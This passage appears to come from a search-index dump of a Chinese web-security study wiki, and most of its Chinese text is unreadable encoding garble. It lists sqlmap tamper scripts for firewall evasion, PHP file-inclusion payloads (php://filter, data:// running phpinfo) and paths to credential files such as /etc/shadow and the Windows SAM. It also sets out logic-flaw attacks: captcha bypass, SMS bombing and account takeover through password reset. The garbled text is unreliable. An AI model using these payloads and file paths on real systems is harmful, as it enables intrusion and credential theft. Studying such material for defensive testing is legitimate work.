ç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·ã€‚ halfversionedmorekeywords.py å½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®º space2morehash.py ç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦ appendnullbyte.py åœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç  ifnull2ifisnull.py ç»•è¿‡å¯¹ IFNULL è¿‡æ»¤ã€‚ æ›¿æ¢ç±»ä¼¼â€™IFNULL(A, B)â€™ä¸ºâ€™IF(ISNULL(A), B, A)â€™ space2mssqlblank.py ç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å· base64encode.py ç”¨base64ç¼–ç æ›¿æ¢ space2mssqlhash.py æ›¿æ¢ç©ºæ ¼ modsecurityversioned.py è¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Š space2mysqlblank.py ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·(mysql) between.py ç”¨betweenæ›¿æ¢å¤§äºå·() space2mysqldash.py æ›¿æ¢ç©ºæ ¼å­—ç¬¦(â€œ)(â€˜ - â€˜)åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œ(â€˜ nâ€™) multiplespaces.py å›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼ space2plus.py ç”¨+æ›¿æ¢ç©ºæ ¼ bluecoat.py ä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥ã€‚ ç„¶åæ›¿æ¢ä¸ºlike nonrecursivereplacement.py å–ä»£predefined SQLå…³é”®å­—withè¡¨ç¤º suitable foræ›¿ä»£(ä¾‹å¦‚ .replace(â€œSELECTâ€ã€â€â€)) filters space2randomblank.py ä»£æ›¿ç©ºæ ¼å­—ç¬¦(â€œâ€)ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›† sp_password.py è¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·çš„æœ«å°¾ chardoubleencode.py åŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„) unionalltounion.py æ›¿æ¢UNION ALL SELECT UNION SELECT charencode.py urlç¼–ç  randomcase.py éšæœºå¤§å°å†™ unmagicquotes.py å®½å­—ç¬¦ç»•è¿‡ GPC addslashes randomcomments.py ç”¨ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font åˆ†å‰²sqlå…³é”®å­— charunicodeencode.py å­—ç¬¦ä¸²unicodeç¼–ç  securesphere.py è¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸² versionedmorekeywords.py æ³¨é‡Šç»•è¿‡ space2comment.py Replaces space character font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252); /fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/font with comments font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font"},{"title":"xxeæ¼æ´","path":"/wiki/WebçŸ¥è¯†ç‚¹/xxeæ¼æ´/xxeæ¼æ´.html","content":"xxeæ¼æ´"},{"title":"æ–‡ä»¶åŒ…å«","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶åŒ…å«/æ–‡ä»¶åŒ…å«.html","content":"æ–‡ä»¶åŒ…å« å‡½æ•°include conn.php: å½“åŒ…å«æ–‡ä»¶å‡ºç°é”™è¯¯æ—¶ï¼Œå‘å‡ºé”™è¯¯ä¿¡æ¯ï¼Œç»§ç»­æ‰§è¡Œ include_once conn.phpï¼šåªåŒ…å«ä¸€æ¬¡ require conn.phpï¼š å½“åŒ…å«å‡ºç°é”™è¯¯æ—¶ï¼Œå‘å‡ºé”™è¯¯ä¿¡æ¯ï¼Œä¸å†æ‰§è¡Œ require_once conn.phpï¼šåªåŒ…å«ä¸€æ¬¡ æœ¬åœ°åŒ…å«æœ¬åœ°æ–‡ä»¶åŒ…å«å°±æ˜¯é€šè¿‡æµè§ˆå™¨åŒ…å«webæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´æ˜¯å› ä¸ºæµè§ˆå™¨åŒ…å«æ–‡ä»¶æ—¶æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å…è®¸éå†ç›®å½•çš„å­—ç¬¦æ³¨å…¥æµè§ˆå™¨å¹¶æ‰§è¡Œã€‚æ–‡ä»¶åŒ…å«æ¼æ´è¿˜åŒ…å«å½“å‰æœåŠ¡å™¨ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼ŒåŒæ—¶æ”¯æŒåŒ…å«Webåº”ç”¨ç¨‹åºçš„ç›®å½•ï¼Œå°è¯•åŒ…æ‹¬ä½ çš„ç¡¬ç›˜çš„ä¸€äº›å†…å®¹ï¼Œä¾‹å¦‚ï¼šC:\\WINDOWS\\system.iniã€‚ phpä¼ªåè®®php://php://input+postæ•°æ®php://filter/read=convert.base64-encode/resource=index.phpdata://text/plain,?php%20phpinfo();? è¿œç¨‹åŒ…å«.allow_url_fopen On allow_url_include On å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šåˆ¶ä½œä»¥æ¶ææ¶æ„æ–‡ä»¶ï¼Œé€šè¿‡httpæˆ–httpsè¿›è¡Œä¸Šä¼ ï¼Œå³å¯è¾¾åˆ°è¿œç¨‹æ§åˆ¶ å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ï¼šWindowsç³»ç»Ÿ c:\\boot.ini æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ c:\\windows\\system32\\inetsrv\\MetaBase.xml IISé…ç½®æ–‡ä»¶ c:\\windows\\repair\\sam å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  c:\\ProgramFiles\\mysql\\my.ini MySQLé…ç½® c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD MySQL rootå¯†ç  c:\\windows\\php.ini php é…ç½®ä¿¡æ¯ LinuxUnixç³»ç»Ÿ etcpasswd è´¦æˆ·ä¿¡æ¯ etcshadow è´¦æˆ·å¯†ç æ–‡ä»¶ usrlocalappapache2confhttpd.conf Apache2é»˜è®¤é…ç½®æ–‡ä»¶ usrlocalappapache2confextrahttpd-vhost.conf è™šæ‹Ÿç½‘ç«™é…ç½® usrlocalappphp5libphp.ini PHPç›¸å…³é…ç½® etchttpdconfhttpd.conf Apacheé…ç½®æ–‡ä»¶ etcmy.conf mysql é…ç½®æ–‡ä»¶"},{"title":"kaliæ“ä½œ","path":"/wiki/WebçŸ¥è¯†ç‚¹/å·¥å…·æŒ‡å—/kaliæ“ä½œ.html","content":"kaliæ“ä½œ åˆ‡æ¢rootsudo passwd rootsshè¿æ¥ssh_configPæœ‰å…³çš„sshd_configä¸¤ä¸ªPæœ‰å…³çš„ æ›´æ–°æºsudo vim etcaptsources.listdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contribæ›´æ–° apt-get update apt-get upgradeapt-get dist-upgradeapt-get clean å®‰è£…vim"},{"title":"æŒ–æ˜æµç¨‹","path":"/wiki/WebçŸ¥è¯†ç‚¹/é€»è¾‘è¶Šæƒ/æŒ–æ˜æµç¨‹.html","content":"é€»è¾‘æ¼æ´æŒ–æ˜é€»è¾‘æ¼æ´#é€»è¾‘æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘è¾“å…¥ç®¡æ§ä¸ä¸¥æˆ–è€…é€»è¾‘å¤ªå¤æ‚ï¼Œå¯¼è‡´ç¨‹åºä¸èƒ½å¤Ÿæ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ï¼Œé€»è¾‘æ¼æ´æ ¹æ®åŠŸèƒ½éœ€æ±‚çš„ä¸åŒäº§ç”Ÿçš„æ¼æ´æ–¹å¼ä¹Ÿä¸åŒã€‚ä¸€èˆ¬å‡ºç°åœ¨ç½‘ç«™ç¨‹åºçš„ç™»å½•æ³¨å†Œã€å¯†ç æ‰¾å›ã€éªŒè¯æ–¹å¼ã€ä¿¡æ¯æŸ¥çœ‹ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ç­‰åœ°æ–¹ã€‚ è¿™ç±»æ¼æ´ä¸åŒäºå¸¸è§WEBæ¼æ´ï¼Œå¸¸è§WEBæ¼æ´éƒ½å¯ä»¥æ€»ç»“ä¸ºä¸€å®šçš„èŒƒå¼ï¼Œè€Œé€»è¾‘æ¼æ´ä¸è¡Œ é€»è¾‘æ¼æ´å‡ºç°çš„åŸå› ä¹Ÿæ˜¯æœ‰å¾ˆå¤šç§ï¼Œéœ€è¦æœ‰ä¸€å®šä¸ªäººç»éªŒç§¯ç´¯æ‰èƒ½åœ¨ä»£ç å®¡è®¡è¿‡ç¨‹ä¸­å‘ç°æ­¤ç±»æ¼æ´ æŒ–æ˜æ€è·¯#é¦–å…ˆå°†æ‰€æœ‰é€»è¾‘æ¼æ´çš„é—®é¢˜åˆ†ä¸ºå‰ç«¯å’Œåç«¯ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå…ˆæµ‹è¯•ç»•è¿‡å‰ç«¯è§„åˆ™é™åˆ¶å†æµ‹è¯•ç»•è¿‡åç«¯è§„åˆ™é™åˆ¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªè¦èƒ½å¤Ÿçªç ´åŸæœ‰è§„åˆ™é™åˆ¶çš„éƒ½å°±å¯ä»¥ç®—æ˜¯æ¼æ´ã€‚ æŒ–æ˜é€»è¾‘æ¼æ´æ€»ä½“æ­¥éª¤åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥ï¼š æ˜ç¡®ä¸šåŠ¡é€»è¾‘æµç¨‹ï¼Œæ ¹æ®ä¸šåŠ¡éœ€æ±‚çš„ç‰¹ç‚¹ï¼Œæœ‰é’ˆå¯¹æ€§çš„è¿›è¡Œæµ‹è¯•ã€‚ å¯»æ‰¾æµç¨‹ä¸­å¯ä»¥è¢«æ“æ§çš„ç¯èŠ‚ï¼Œåˆ†æå¯è¢«æ“æ§ç¯èŠ‚ä¸­å¯èƒ½äº§ç”Ÿçš„é€»è¾‘é—®é¢˜ã€‚ ç å®ä¿®æ”¹å‚æ•°è§¦å‘é€»è¾‘é—®é¢˜ï¼Œé‡æ”¾åŒ…å¯¹æ¯”ç»“æœå·®å¼‚ã€‚ ä¸šåŠ¡é€»è¾‘æ¼æ´#- ç™»å½•æ¨¡å—# æš´åŠ›ç ´è§£ ä»»æ„ç”¨æˆ·å¯†ç ç™»é™† çŸ­ä¿¡é‚®ç®±è½°ç‚¸ éªŒè¯ç ç»•è¿‡çˆ†ç ´é‡æ”¾å›ä¼  ç”¨æˆ·åæ‰‹æœºå·æšä¸¾ è¶Šæƒç™»é™†ï¼ˆä¾‹å¦‚ä¿®æ”¹æ•°æ®åŒ…ä¸­ç”¨æˆ·IDï¼‰ è´¦å·æƒé™ç»•è¿‡ï¼ˆè¶Šæƒï¼‰ Cookieä¼ªé€  ç”¨æˆ·ç©ºå¯†ç ç™»é™† æ³¨å†Œæ¨¡å—# å‰ç«¯éªŒè¯ç»•è¿‡ ç”¨æˆ·ä»»æ„æ‰¹é‡æ³¨å†Œ æ¶æ„éªŒè¯æ³¨å†Œè´¦æˆ· è´¦æˆ·é‡å¤æ³¨å†Œ ç”¨æˆ·åç»‘å®šæ‰‹æœºå·æšä¸¾ æ³¨å†Œä¿¡æ¯æ’å…¥XSS çŸ­ä¿¡é‚®ç®±è½°ç‚¸ éªŒè¯ç ç»•è¿‡çˆ†ç ´é‡æ”¾å›ä¼  å…¶ä»–éªŒè¯æœºåˆ¶ç»•è¿‡ å¯†ç æ‰¾å›# ä»»æ„æ‰¹é‡ç”¨æˆ·å¯†ç é‡ç½® ä»»æ„é‚®ç®±æ‰‹æœºå·éªŒè¯ï¼ˆéªŒè¯ç ä¸ç»‘å®šç”¨æˆ·æœªç»Ÿä¸€éªŒè¯ï¼‰ ç”¨æˆ·ç»‘å®šæ‰‹æœºå·æšä¸¾ æ–°å¯†ç åŠ«æŒ çŸ­ä¿¡éªŒè¯ç åŠ«æŒç»•è¿‡å›ä¼ çˆ†ç ´é‡æ”¾ ç”¨æˆ·é‚®ç®±åŠ«æŒç¯¡æ”¹ å…¶ä»–éªŒè¯æœºåˆ¶ç»•è¿‡ è´­ä¹°æ”¯ä»˜å……å€¼# å•†å“é‡‘é¢æ•°é‡ç¯¡æ”¹ æ›¿æ¢æ”¯ä»˜æ¨¡å— äº¤æ˜“ä¿¡æ¯æ³„éœ² è™šå‡å……å€¼é‡‘é¢ å……å€¼è´¦æˆ·é‡‘é¢æ•°é‡ç¯¡æ”¹ æ”¯ä»˜éªŒè¯ç»•è¿‡ æ•´æ•°æº¢å‡ºï¼Œintæœ€å¤§å€¼ä¸º2147483647 ä¿®æ”¹æœ¬åœ°JSæˆ–æœåŠ¡ç«¯è¿”å›çš„æ•°æ®åŒ…ä¸­çš„å…³é”®å€¼ ä¸ªäººèµ„æ–™# æ‰‹æœºå·ç”¨æˆ·é‚®ç®±æšä¸¾ ä¿®æ”¹ä¸ªäººèµ„æ–™æ’å…¥XSS é‚®ç®±ç”¨æˆ·æ‰‹æœºå·ç¯¡æ”¹ ç”¨æˆ·ä¿¡æ¯éå†æ³„éœ² è¶Šæƒä¿®æ”¹ä»–äººè´¦æˆ·èµ„æ–™ æŠ½å¥–æ´»åŠ¨# ä»»æ„æŠ½å¥– ç›—åˆ·å¥–å“ç§¯åˆ† æŠ½å¥–ç§¯åˆ†æ¬¡æ•°ç¯¡æ”¹ å¹¶å‘æŠ½å¥– é‚€è¯·ç XSSï¼ˆéªŒè¯ç URLå¯èƒ½åŒ…å«ç”¨æˆ·åï¼Œå¯å°†ç”¨æˆ·åä¿®æ”¹ä¸ºXSSä»£ç ï¼‰ ä»£é‡‘åˆ¸ä¼˜æƒ åˆ¸# æ‰¹é‡åˆ·å–ä»£é‡‘åˆ¸ä¼˜æƒ åˆ¸ æ›´æ”¹ä»£é‡‘åˆ¸é‡‘é¢æ•°é‡ æ›´æ”¹ä¼˜æƒ åˆ¸æ•°é‡ å¹¶å‘é€»è¾‘æ¼æ´ï¼ˆburpæ‰¹é‡è·å–ä¼˜æƒ åŠµç­‰ï¼‰ è®¢å•# è®¢å•ä¿¡æ¯éå†æ³„éœ² è®¢å•ä¿¡æ¯æ³„éœ²å¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ² è¶Šæƒä¿®æ”¹åˆ é™¤ä»–äººè®¢å• è´¦æˆ·# è´¦æˆ·éªŒè¯ç»•è¿‡ è´¦æˆ·é‡‘é¢ç¯¡æ”¹ è´¦æˆ·ç»‘å®šæ‰‹æœºå·ç»•è¿‡ è´¦æˆ·ç¬¬ä¸‰æ–¹è´¦æˆ·ç»‘å®šç»•è¿‡ ä¼šå‘˜ç³»ç»Ÿ# ç”¨æˆ·è¶Šæƒæ“ä½œè®¿é—® ä¸ªäººèµ„æ–™ä¿¡æ¯éå†æ³„éœ² ä¿®æ”¹ä¸ªäººä¿¡æ¯å¤´åƒä¸Šä¼ ä»»æ„æ–‡ä»¶ å¦‚æœé‡åˆ°xlsxdocxï¼Œå¯èƒ½å­˜åœ¨XXEï¼Œä¸Šä¼ æ¶æ„æ–‡æ¡£ç›²æµ‹ ä¿®æ”¹ä¸ªäººä¿¡æ¯é¡µé¢æ’å…¥XSS ä¼ è¾“è¿‡ç¨‹# POSTCookieæ³¨å…¥ cookieåŠ«æŒ ä¿®æ”¹ä¿¡æ¯å¤„æ— sessiontokenå¯¼è‡´CSRF æ˜æ–‡ä¼ è¾“è´¦å·å¯†ç  è¯„è®ºæ¨¡å—# POSTæ³¨å…¥ æ— sessiontokenå¯¼è‡´CSRF è¯„è®ºæ—¶æ’å…¥XSS éå†ç”¨æˆ·IDå¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ² æ¶æ„æ‰¹é‡åˆ·è¯„è®ºæ•°é‡ ç¬¬ä¸‰æ–¹ç³»ç»Ÿ# ç¬¬ä¸‰æ–¹ç³»ç»Ÿæœªæˆæƒè®¿é—® ç¬¬ä¸‰æ–¹è´¦æˆ·ä¿¡æ¯éå† ç¬¬ä¸‰æ–¹è´¦æˆ·è¶Šæƒè®¿é—® ç¬¬ä¸‰æ–¹è´¦æˆ·ä¿¡æ¯æ³„éœ² ç¬¬ä¸‰æ–¹åº”ç”¨ç‰ˆæœ¬æ¼æ´ éªŒè¯ç å®‰å…¨# éªŒè¯ç å‚æ•°åˆ é™¤ç»•è¿‡ éªŒè¯ç ç”Ÿæˆè§„å¾‹é¢„æµ‹ éªŒè¯ç å›¾åƒå†…å®¹å¯è¢«å·¥å…·è¯†åˆ« éªŒè¯ç é•¿æœŸä¸å¤±æ•ˆï¼Œè¿›è¡Œçˆ†ç ´ éªŒè¯ç å›æ˜¾åˆ°é¡µé¢æˆ–è€…æ•°æ®åŒ…ä¸­ å•ä¸ªéªŒè¯ç å¯å¤šæ¬¡é‡å¤åˆ©ç”¨ çŸ­ä¿¡éªŒè¯ç ä¸æ‰‹æœºå·æœªç»Ÿä¸€éªŒè¯ çŸ­ä¿¡éªŒè¯ç æœªå¯¹å•ä¸ªæ‰‹æœºå·å‘é€æ¬¡æ•°è¿›è¡Œé™åˆ¶ çŸ­ä¿¡éªŒè¯ç æœªåšå‘é€æ—¶é—´é™åˆ¶ï¼Œå¯¼è‡´çŸ­ä¿¡è½°ç‚¸ å¯èƒ½å­˜åœ¨ä¸‡èƒ½éªŒè¯ç  æ¥å£è°ƒç”¨# æœªæˆæƒè®¿é—®æ•æ„Ÿæ•°æ®æ¥å£ çŸ­ä¿¡apiæ¥å£æ³„éœ²è¢«æ¶æ„è°ƒç”¨ æ•°æ®åº“æ¥å£æ³„éœ²ï¼Œå¯¼è‡´æ•°æ®å¯è¢«æ¶æ„æ“ä½œ é€»è¾‘æ¼æ´åˆ©ç”¨#éªŒè¯ç #ä¸‡èƒ½éªŒè¯ç ï¼š ç¨‹åºå‘˜åœ¨å¼€å‘éªŒè¯ç æ¨¡å—æ—¶ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒç”¨éªŒè¯ç éªŒè¯åŠŸèƒ½æ˜¯å¦å®Œå–„ï¼Œæ•…æ„è®¾ç½®äº†å‡ ä¸ªä¸‡èƒ½çš„éªŒè¯ç ä½œä¸ºæµ‹è¯•æ•°æ®ã€‚åœ¨å¼€å‘ç»“æŸåç”±äºç¨‹åºå‘˜çš„ç–å¿½ï¼Œæ²¡æœ‰åˆ é™¤è¯¥æµ‹è¯•éªŒè¯ç æ•°æ®ä»è€Œå¯¼è‡´è¯¥æ¼æ´çš„äº§ç”Ÿã€‚ éªŒè¯ç å›ä¼ ï¼š é€šè¿‡æŠ“åŒ…çš„æ–¹å¼ï¼Œå¯ä»¥çœ‹åˆ°éªŒè¯ç å†…å®¹å›æ˜¾åœ¨äº†æ•°æ®åŒ…ä¸­ï¼›æˆ–è€…é€šè¿‡æŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥çœ‹åˆ°éªŒè¯ç ä¸­çš„å†…å®¹ï¼Œå¯¼è‡´æ­£ç¡®éªŒè¯ç å¯ä»¥è¢«ç›´æ¥è¯»å–åˆ©ç”¨åˆ°ã€‚ åˆ é™¤éªŒè¯ç ç»•è¿‡ï¼š é€šè¿‡æŠ“åŒ…å°†éªŒè¯ç çš„å€¼åˆ é™¤æˆ–è€…ç›´æ¥åˆ é™¤éªŒè¯ç å‚æ•°ï¼Œç„¶åå°†ä¿®æ”¹åçš„æ•°æ®åŒ…è¿›è¡Œé‡æ”¾å¯¼è‡´éªŒè¯ç éªŒè¯è¢«ç»•è¿‡ã€‚ éªŒè¯ç çˆ†ç ´ï¼š æ­¤å¤„éªŒè¯ç çˆ†ç ´é€šå¸¸æ˜¯æŒ‡æ‰‹æœºçŸ­ä¿¡éªŒè¯çš„æ–¹å¼ï¼Œç”±äºæ²¡æœ‰å¯¹è¾“å…¥åŒä¸€ä¸ªéªŒè¯ç çš„æ¬¡æ•°åšé™åˆ¶ï¼Œå¹¶ä¸”éªŒè¯ç çš„å†…å®¹å¤ªç®€å•ï¼Œä¾‹å¦‚4ä½æˆ–è€…6ä½çš„çº¯æ•°å­—ç»„æˆã€‚å¯ä»¥é€šè¿‡Burpçš„Intruderæ¨¡å—å¯¹éªŒè¯ç å†…å®¹è¿›è¡Œçˆ†ç ´ï¼Œç›´åˆ°åŒ¹é…åˆ°æ­£ç¡®çš„éªŒè¯ç ã€‚ éªŒè¯ç é‡æ”¾ é¦–å…ˆï¼Œè¾“å…¥é”™è¯¯çš„éªŒè¯ç ï¼Œè¿›è¡ŒæŠ“åŒ…é‡æ”¾ä¸€æ¬¡ï¼Œè§‚å¯ŸéªŒè¯çš„è¿”å›çš„æ•°æ®åŒ…å†…å®¹ï¼Œå†ç”¨æ­£ç¡®çš„éªŒè¯ç å†è¿›è¡ŒæŠ“åŒ…é‡æ”¾ï¼Œå¯¹æ¯”ä¸¤ä¸ªæ•°æ®åŒ…çš„å·®å¼‚ï¼Œç„¶åæ ¹æ®è¿™äº›å·®å¼‚éªŒè¯ç æ˜¯å¦å¤±æ•ˆã€‚ ç„¶åå°†æ­£ç¡®çš„éªŒè¯ç å‘é€è‡³Burpçš„Intruderæ¨¡è¿›è¡Œä¸æ–­çš„é‡æ”¾ï¼Œæ¯”è¾ƒè¿™äº›æ•°æ®åŒ…æ˜¯å¦éƒ½æ˜¯æ­£ç¡®éªŒè¯ç æ—¶è¿”å›çš„ä¸€æ ·å†…å®¹ï¼Œå¦‚æœæ•°æ®åŒ…å†…å®¹ä¸€æ ·è¯´æ˜å­˜åœ¨éªŒè¯ç é‡æ”¾çš„æ¼æ´ã€‚ éªŒè¯ç ä¸æ‰‹æœºå·æœªç»Ÿä¸€åŒ¹é… é¦–å…ˆç”¨è‡ªå·±çš„æ‰‹æœºæ”¶åˆ°æ­£ç¡®éªŒè¯ç ï¼Œåœ¨ç‚¹å‡»æ³¨å†Œæ—¶æ‹¦æˆªåŒ…å°†æ‰‹æœºå·æ”¹ä¸ºå…¶ä»–æ‰‹æœºå·ï¼Œå¦‚æœæˆåŠŸçš„è¯å°±æ³¨å†Œäº†åˆ«äººçš„æ‰‹æœºå·ï¼Œè¿™æ˜¯å› ä¸ºåç«¯ä»…éªŒè¯äº†éªŒè¯ç æ˜¯å¦æ˜¯æ­£ç¡®çš„è€Œæ²¡æœ‰éªŒè¯éªŒè¯ç æ˜¯å¦ä¸æ‰‹æœºåŒ¹é…ã€‚ çŸ­ä¿¡è½°ç‚¸#å°è¯•ä¸æ–­é‡æ”¾å‘é€éªŒè¯ç çš„æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹æ‰‹æœºæ˜¯å¦åœ¨çŸ­æ—¶é—´å†…æ”¶åˆ°äº†å¤šæ¡çŸ­ä¿¡ï¼Œæ˜¯çš„è¯åˆ™å­˜åœ¨çŸ­ä¿¡è½°ç‚¸æ¼æ´ï¼Œè¿™æ˜¯å› ä¸ºåç«¯æ²¡æœ‰å¯¹å‘é€æ‰‹æœºçŸ­ä¿¡åšæ—¶é—´æ¬¡æ•°é™åˆ¶ã€‚ å¦‚æœåç«¯å¯¹çŸ­ä¿¡éªŒè¯ç åšäº†é™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ä»¥ä¸‹å‡ ç§æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š åˆ é™¤ä¿®æ”¹cookieæˆ–è€…è¿”å›å€¼ï¼Œé‡æ”¾æ•°æ®åŒ… éå†å‚æ•°å‘é€æ•°æ®åŒ… å¯¹å‚æ•°è¿›è¡Œå åŠ  æ‰‹æœºå·åé¢åŠ ç©ºæ ¼(%20)æˆ–è€…å‰é¢åŠ å…¶ä»–çš„æ¯”å¦‚+86ã€é€—å·ã€åˆ†å·ã€å­—æ¯ç­‰ è¯·æ±‚å‚æ•°ä¿®æ”¹å¤§å°å†™ï¼Œæˆ–è€…æ·»åŠ è¯·æ±‚å‚æ•°id1 å¤šæ¥å£æµ‹è¯•ï¼Œå¯èƒ½ç™»é™†ä½ç½®åšäº†é˜²æŠ¤ï¼Œä½†å¯†ç æ‰¾å›å‡ºæ²¡æœ‰é˜²æŠ¤ åˆ©ç”¨è°ƒç”¨æ¥å£ç»•è¿‡çŸ­ä¿¡è½°ç‚¸é™åˆ¶ ä¿®æ”¹IPç»•è¿‡çŸ­ä¿¡è½°ç‚¸é™åˆ¶ æ·»åŠ é‡å¤çš„æ‰‹æœºå·å‚æ•°ï¼Œé‡æ”¾æ•°æ®åŒ… è¶Šæƒæ“ä½œ#é¦–å…ˆç”¨ä¸€ä¸ªè´¦å·ç™»é™†ç³»ç»Ÿåï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·å‚æ•°ï¼Œå¯ä»¥è¾¾åˆ°æŸ¥çœ‹æˆ–è€…ä¿®æ”¹ä»–äººè´¦å·çš„ç›®çš„ï¼Œå°½é‡å¯¹å¤šæ¥å£æˆ–è€…å¤šåŠŸèƒ½æ¨¡å—è¿›è¡Œä¸æ–­æµ‹è¯•è¶Šæƒæ“ä½œã€‚åŒæ—¶ä¹Ÿè¦å¤šä¸ªè´¦å·ç™»é™†ï¼Œåˆ†æå¯¹æ¯”è¿™äº›è´¦å·æ•°æ®åŒ…ä¸­çš„è¯·æ±‚å‚æ•°å·®å¼‚ï¼Œé€šè¿‡ä¿®æ”¹è¿™äº›å­˜åœ¨å·®å¼‚çš„å‚æ•°ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½å¤Ÿè¾¾åˆ°è¶Šæƒæ“ä½œçš„ç›®çš„ã€‚ è¶Šæƒæ¼æ´åˆåˆ†ä¸ºå¹³è¡Œè¶Šæƒï¼Œå‚ç›´è¶Šæƒå’Œäº¤å‰è¶Šæƒã€‚ å¹³è¡Œè¶Šæƒï¼šæƒé™ç±»å‹ä¸å˜ï¼Œæƒé™IDæ”¹å˜ å‚ç›´è¶Šæƒï¼šæƒé™IDä¸å˜ï¼Œæƒé™ç±»å‹æ”¹å˜ äº¤å‰è¶Šæƒï¼šå³æ”¹å˜IDï¼Œä¹Ÿæ”¹å˜æƒé™ ç”¨æˆ·ä¿¡æ¯æ³„éœ²#å¯èƒ½å­˜åœ¨ç”¨æˆ·ä¸ªäººä¿¡æ¯é¡µé¢ã€å¯†ç æ‰¾å›å¤„ä»¥åŠå„ç§è°ƒç”¨åˆ°ç”¨æˆ·ä¿¡æ¯æ•°æ®çš„åœ°æ–¹ï¼Œé€šè¿‡æŠ“åŒ…æŸ¥çœ‹è¿”å›ä¿¡æ¯æ˜¯å¦åŠ è½½äº†ä¸€äº›æ•æ„Ÿçš„æ•°æ®ä¿¡æ¯ï¼Œæ¯”å¦‚æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯çš„æ—¶å€™ä¹Ÿå°†ç”¨æˆ·çš„å¯†ç æ•°æ®åœ¨æ•°æ®åŒ…ä¸­å›æ˜¾äº†ï¼›æˆ–è€…åœ¨ç”¨æˆ·ä¸ªäººèµ„æ–™é¡µé¢ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·IDå‚æ•°ï¼Œå¯ä»¥é€šè¿‡éå†æŸ¥è¯¢åˆ°å…¶ä»–è´¦å·çš„ç”¨æˆ·èµ„æ–™ï¼Œå¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ²ï¼› ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®#é€šå¸¸å‘ç”Ÿåœ¨å¿˜è®°å¯†ç å¤„ï¼Œç”±äºç³»ç»Ÿæ²¡æœ‰ä¸¥æ ¼åŒ¹é…ç”¨æˆ·å¿˜è®°å¯†ç æ—¶çš„éªŒè¯æ–¹å¼ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·å‚æ•°ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·çš„å¯†ç éƒ½èƒ½å¤Ÿè¢«é‡ç½®ã€‚ æ¯”å¦‚æŸä¸ªå¿˜è®°å¯†ç åŠŸèƒ½å¤„é‡‡ç”¨æ‰‹æœºå·çŸ­ä¿¡éªŒè¯çš„æ–¹å¼æ¥é‡ç½®ç”¨æˆ·å¯†ç ï¼Œå¦‚æœè¯¥éªŒè¯æ‰‹æœºå·æ²¡æœ‰å¯¹ç”¨æˆ·è´¦æˆ·è¿›è¡Œç»‘å®šï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¾“å…¥ä»»æ„æ‰‹æœºå·æ¥æ”¶çŸ­ä¿¡éªŒè¯ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨è¯¥éªŒè¯ç 